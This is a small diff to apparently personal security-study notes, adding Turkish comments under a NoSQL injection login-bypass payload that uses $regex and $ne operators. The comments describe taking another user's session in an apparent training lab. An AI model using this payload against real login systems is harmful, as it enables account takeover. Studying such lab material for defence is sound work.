@@ -212,5 +212,6 @@ https://github.com/reddelexc/hackerone-reports
 ```json
 {"username":{"$regex":"^w"},"password":{
 "$ne":"dgdfdffdfdfdf"}}
-// w ile baslasin dedik ve bize wiener kullanicisini response da dondurdu Location: basliginda 
+// w ile baslasin dedik ve bize wiener kullanicisini response da dondurdu Location: basliginda ve altindaki session bilgileri o kullanicinin oluyor response daki
+//regex e a harfini yazdik ve gelen bilgideki sessionu aldik ve icerdeyiz
 ```
